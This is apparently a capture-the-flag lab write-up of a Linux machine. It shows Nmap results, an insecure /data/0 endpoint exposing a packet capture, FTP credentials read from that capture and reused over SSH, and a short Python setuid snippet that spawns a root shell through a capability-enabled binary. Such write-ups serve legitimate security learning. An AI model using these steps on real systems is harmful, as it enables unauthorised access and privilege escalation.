## Reconnaissance
```
# Nmap 7.993 scan initiated Mon Nov 16 23:24:09 2026 as: nmap -sV -o nmap-scan.txt 10.129.181.23
Nmap scan report for 10.129.181.23
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 16 23:24:53 2026 -- 1 IP address (1 host up) scanned in 43.83 seconds
```

## Snapshot
By clicking to `Security Snapshot (5 Second PCAP + Analysis)` from side panel, we got redirected to `/data/1`.

![](../Image%20Trunk/Pasted%20image%2020261116233039.png)

Trying it again, and it gets redirected to `/data/2`. Interesting thing is we can move between `/data/1` and `/data/2`, but trying out `/data/3` will results in 302 found and redirected back to `/`. This is because the numbers were being generated incerementally when we do a `/capture`. Seems like we can also download the captured .pcap file.

Interesting find! we can try `/data/0` and it actually has a data in it.

![](../Image%20Trunk/Pasted%20image%2020261116233844.png)

## Analyzing data 0
By opening pcap file with Wireshark, I found something interesting:

![](../Image%20Trunk/Pasted%20image%2020261116234200.png)

An FTP login attempt was captured here. Since it does not uses secure connection, we can clearly see Nathan's user and password.

## Gaining foothold
Now while it is an FTP credential, I tried to logged in to the machine using ssh. The password still works! Inside, there is a `user.txt` and inside it is the first User Flag.

![](../Image%20Trunk/Pasted%20image%2020261116234735.png)

## Privilege Escalation
Trying out `sudo -l` resulted in the user not authorised any sudo command. Therefore, I used linpeas and found a highlighted process with capability sets.

![](../Image%20Trunk/Pasted%20image%2020261117000414.png)

I then used below's code to have access to root shell:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Now that I got the root access, getting the flag was as `cat /root/root.txt`.

![](../Image%20Trunk/Pasted%20image%2020261117002015.png)